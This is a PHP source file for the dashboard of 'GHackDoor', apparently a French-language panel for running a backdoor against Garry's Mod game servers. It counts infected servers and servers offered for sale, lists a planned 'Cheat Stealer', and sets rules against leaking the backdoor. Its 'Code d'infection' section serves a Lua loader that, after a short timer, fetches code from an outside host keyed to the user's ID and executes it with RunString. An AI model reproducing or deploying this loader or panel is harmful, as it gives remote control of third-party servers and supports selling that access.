<?php
include 'core/class/include.php';
$ip = $_SERVER['REMOTE_ADDR'];
    if(BanIP::IsBanned($_SERVER["REMOTE_ADDR"]))
  {
    die("Vous êtes banni IP, venez sur le discord pour vous faire debannir https://discord.gg/FUf4yUb");
  }
// Redirige l'utilisateur si il n'est pas authentifier
if (!Account::isAuthentified())
{
    header('Location: fe15hg6rt1e.php');

    exit();
}

 $color = Account::GetUser()["color"]; 
  $colort = Account::GetUser()["color_second"]; 
 $colorb = Account::GetUser()["color_trois"]; 
 if($colorb == "")
   	 $colorb = "1a6d7d";
  if($colort == "")
 $colort = "ffffff";
 if($color == "")
 $color = "1c1c1c";
?>
<!DOCTYPE html>

<?php
include 'defaultpage.php';
?>

<body id="page-top">

  <!-- Page Wrapper -->
  <div id="wrapper">
  <?php
  include 'defaultnav.php';
  ?>

    <!-- Content Wrapper -->
    <div id="content-wrapper" class="d-flex flex-column">

      <!-- Main Content -->
      <div id="content">

         <?php
        include 'defaultnavbar.php';
        ?>

        <!-- Begin Page Content -->
        <div class="container-fluid">

          <!-- Content Row -->
          <div class="row">

            <!-- Earnings (Monthly) Card Example -->
            <div class="col-xl-3 col-md-6 mb-4">
              <div class="card border-left-primary shadow h-100 py-2">
                <div class="card-body">
                  <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                      <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">Nombres de Serveurs infecter</div>
                      <div class="h5 mb-0 font-weight-bold text-gray-800"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => $_SESSION["id"]]); ?></div>
                    </div>
                    <div class="col-auto">
                      <i class="fas fa-server fa-2x text-gray-300"></i>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <!-- Earnings (Monthly) Card Example -->
            <div class="col-xl-3 col-md-6 mb-4">
              <div class="card border-left-primary shadow h-100 py-2">
                <div class="card-body">
                  <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                      <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">Nombres de a vendre</div>
                      <div class="h5 mb-0 font-weight-bold text-gray-800"><?php echo $GLOBALS['DB']->Count("server_list", ["userid" => "666"]); ?></div>
                    </div>
                    <div class="col-auto">
                      <i class="fas fa-server fa-2x text-gray-300"></i>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            <!-- Earnings (Monthly) Card Example -->
            <div class="col-xl-3 col-md-6 mb-4">
              <div class="card border-left-primary shadow h-100 py-2">
                <div class="card-body">
                  <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                      <div class="text-xs font-weight-bold text-primary text-uppercase mb-1">Nombres de joueurs enregistrer</div>
                      <div class="h5 mb-0 font-weight-bold text-gray-800"><?php echo $GLOBALS['DB']->Count("players_list"); ?></div>
                    </div>
                    <div class="col-auto">
                      <i class="fas fa-server fa-2x text-gray-300"></i>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            

            <!-- Earnings (Monthly) Card Example -->
            <div class="col-xl-3 col-md-6 mb-4">
              <div class="card border-left-info shadow h-100 py-2">
                <div class="card-body">
                  <div class="row no-gutters align-items-center">
                    <div class="col mr-2">
                      <div class="text-xs font-weight-bold text-info text-uppercase mb-1">Nombres de requêtes</div>
                      <div class="row no-gutters align-items-center">
                        <div class="col-auto">
                          <div class="h5 mb-0 mr-3 font-weight-bold text-gray-800"><?php echo Stats::GetValue("nbreqs"); ?></div>
                        </div>
                        <div class="col">
                        </div>
                      </div>
                    </div>
                    <div class="col-auto">
                      <i class="fas fa-clipboard-list fa-2x text-gray-300"></i>
                    </div>
                  </div>
                </div>
              </div>
            </div>


          <!-- Content Row -->

             

          <!-- Content Row -->
          <div class="row">

            <!-- Content Column -->
            <div class="col-lg-6 mb-4">

              <!-- Project Card Example -->


              <div class="card shadow mb-4">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary">Projets</h6>
                </div>
                <div class="card-body">
                  <h4 class="small font-weight-bold">Cheat Stealer <span class="float-right">0%</span></h4>
                  <div class="progress mb-4">
                    <div class="progress-bar bg-info" role="progressbar" style="width: 0%" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100"></div>
                  </div>
                  <h4 class="small font-weight-bold">Nouveau designe <span class="float-right">85%</span></h4>
                  <div class="progress mb-4">
                    <div class="progress-bar bg-info" role="progressbar" style="width: 85%" aria-valuenow="80" aria-valuemin="0" aria-valuemax="100"></div>
                  </div>
                  <h4 class="small font-weight-bold">Meilleur systeme de compte/serveurs <span class="float-right">Complete!</span></h4>
                  <div class="progress">
                    <div class="progress-bar bg-success" role="progressbar" style="width: 100%" aria-valuenow="100" aria-valuemin="0" aria-valuemax="100"></div>
                  </div>
                </div>
              </div>
              <div class="card shadow">
                <div class="card-header">
                  <h6 class="m-0 font-weight-bold text-primary">Régles</h6>
                </div>
                <div class="card-body">
                
               <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                      Régles 1 - N'envoyer pas le lien de login, backdoor, AUCUN lien du panel ( Votre compte sera supprimer )
                    </div>
                </div>

                <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                      Régles 2 - Ne partager pas votre ID et MDP a une personne sans autorisation du fondateur
                    </div>
                </div>

                <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                      Régles 3 - Ne pas montrer des images/vidéos du panel, les admins s'occupe de sa pour les démonstration !
                    </div>
                </div>

                <div class="mb-1 border-left-success shadow">
                    <div class="card-body">
                      Régles 4 - Ne pas mettre notre backdoor sur le workshop, ici on est la pour niquer des serveurs illégal et non des serveurs qui ont rien fait !
                    </div>
                </div>

                </div>
              </div>

                    


              <!-- Color System -->
          
            
              </div>
<div class="row">

            <!-- Content Column -->
            <div class="col-lg-10 mb-6">
          <div class="card shadow mb-5">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary">Discord</h6>
                </div>
                <div class="card-body">
                  <iframe src="https://discordapp.com/widget?id=600417348502945815&theme=dark"  height="635" allowtransparency="true" style="position: relative; width: 100%;" frameborder="0"></iframe>
                </div>
              </div>
            </div>

          </div>

 <div class="card shadow mb-5">
                <div class="card-header py-3">
                  <h6 class="m-0 font-weight-bold text-primary">Code d'infection</h6>
                </div>
                <div class="card-body">
                  
                  
           <a download="backdoor_court.lua" href="data:image/png;base64,<?php echo base64_encode("timer.Simple(3,function()http.Fetch([[http://gblk.ga/f?k=".$_SESSION["id"]."]],RunString)end)"); ?>" class="btn btn-danger">Télécharger</a> </br>
                  </div>
                </div>
              <!-- Illustrations -->
              

              <!-- Approach -->
      

              

          </div>

        </div>
        <!-- /.container-fluid -->

      </div>
      <!-- End of Main Content -->

      <!-- Footer -->
      <footer class="sticky-footer bg-white">
        <div class="container my-auto">
          <div class="copyright text-center my-auto">
            <span>Copyright &copy; GHackDoor 2019</span>
          </div>
        </div>
      </footer>
      <!-- End of Footer -->

    </div>
    <!-- End of Content Wrapper -->

  </div>
  <!-- End of Page Wrapper -->

  <!-- Scroll to Top Button-->
  <a class="scroll-to-top rounded" href="#page-top">
    <i class="fas fa-angle-up"></i>
  </a>

  <!-- Logout Modal-->
  <div class="modal fade" id="logoutModal" tabindex="-1" role="dialog" aria-labelledby="exampleModalLabel" aria-hidden="true">
    <div class="modal-dialog" role="document">
      <div class="modal-content">
        <div class="modal-header">
          <h5 class="modal-title" id="exampleModalLabel">Etes vous sur de vouloir vous déconnecter ?</h5>
          <button class="close" type="button" data-dismiss="modal" aria-label="Close">
            <span aria-hidden="true">×</span>
          </button>
        </div>
        <div class="modal-body">Cliquer sur "Deconnexion" pour vous déconnecter.</div>
        <div class="modal-footer">
          <button class="btn btn-secondary" type="button" data-dismiss="modal">Annulé</button>
          <a class="btn btn-primary" href="logout.php">Deconnexion</a>
        </div>
      </div>
    </div>
  </div>

  <!-- Bootstrap core JavaScript-->
  <script src="vendor/jquery/jquery.min.js"></script>
  <script src="vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Core plugin JavaScript-->
  <script src="vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Custom scripts for all pages-->
  <script src="js/sb-admin-2.min.js"></script>

  <!-- Page level plugins -->
  <script src="vendor/chart.js/Chart.min.js"></script>

  <!-- Page level custom scripts -->
  <script src="js/demo/chart-area-demo.js"></script>
  <script src="js/demo/chart-pie-demo.js"></script>
</body>

<script src="js/jquery.min.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/datatables.bootstrap.min.js"></script>
<script src="js/custom.js"></script>
<script>
  function copyToClipboard(element) {
  var $temp = $("<input>");
  $("body").append($temp);
  $temp.val($(element).text()).select();
  document.execCommand("copy");
  $temp.remove();
}
</script>
</html>
